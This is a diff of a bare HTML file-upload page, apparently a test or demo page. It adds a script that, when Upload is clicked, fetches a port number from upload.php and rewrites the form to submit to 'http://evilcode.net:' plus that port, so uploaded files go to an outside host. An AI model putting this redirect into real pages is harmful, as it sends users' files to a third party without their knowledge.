@@ -1,17 +1,35 @@
 <html>
-<head><title>File Upload</title></head>
-<body>
+<head><title>File Upload</title>
+<script type="text/javascript">
+function foo() {
 
-<form action="generic_mfdhandler.php" method="post" enctype="multipart/form-data" accept-charset="UTF-8">
-<input type="file" name="file" value=""/>
-<input type="submit" name="submit" value="Upload"/>
-</form>
+    var url = 'upload.php';
 
-<br/>
-<form action="http://fileupload:54321" method="post" enctype="multipart/form-data" accept-charset="UTF-8">
+    // branch for native XMLHttpRequest object
+    if (window.XMLHttpRequest) {
+        req = new XMLHttpRequest();
+        req.open("GET", url, false);
+        ret = req.send(null);
+    // branch for IE/Windows ActiveX version
+    } else if (window.ActiveXObject) {
+        req = new ActiveXObject("Microsoft.XMLHTTP");
+        if (req) {
+            req.open("GET", url, false);
+            ret = req.send();
+        }
+    }
+
+alert('Server on port: ' + req.responseText);
+
+  uf = document.getElementById('uploadform');
+  uf.action = 'http://evilcode.net:' + req.responseText;
+}
+</script>
+</head><body>
+
+<form id="uploadform" action="upload.php" method="post" enctype="multipart/form-data" accept-charset="UTF-8">
 <input type="file" name="file1" value=""/>
-<input type="file" name="file2" value=""/>
-<input type="submit" name="submit" value="Upload"/>
+<input type="submit" name="submit" value="Upload" onclick="javascript:foo();" />
 </form>
 
 </body>
